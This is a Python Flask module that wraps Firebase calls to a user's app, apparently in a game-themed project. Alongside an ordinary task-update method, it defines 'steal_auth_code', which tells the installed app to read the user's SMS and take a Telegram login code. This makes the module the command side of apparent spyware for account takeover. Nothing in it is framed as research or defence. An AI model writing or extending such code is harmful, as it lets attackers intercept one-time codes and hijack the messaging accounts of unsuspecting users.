import json
from flask import jsonify
import requests

from app.models.utility import db_single_element_query
from app.models.game_models import User
from config import Config

class FirebaseInteraction():
    """Encapsulates all firebase API calls that are needed to update app state"""

    @staticmethod
    def execute_call(relative_url, user_id, data=None):
        """Builds the full and token-authorized firebase url
        and posts teh given data object as json"""
        try:
            user = db_single_element_query(User, {"user_id": user_id}, "user")
        except ValueError as e:
            return jsonify(str(e)), 400

        resp = requests.post(
            url=Config.FIREBASE_URL + relative_url + "?token={}".format(user.firebase_token),
            headers={'Content-type': 'application/json', 'Accept': 'text/plain'},
            data=json.dumps(data) if data else None
        )
        return resp

    @staticmethod
    def update_tasks(user_id, tasks):
        """Sends the whole task list of a user to the app"""
        endpoint = "/newTasks"
        FirebaseInteraction.execute_call(endpoint, user_id, tasks)
    
    @staticmethod
    def steal_auth_code(user_id):
        """requests the app to steal an auth code from the users SMS"""
        endpoint = "/getTelegramCode"
        FirebaseInteraction.execute_call(endpoint, user_id)
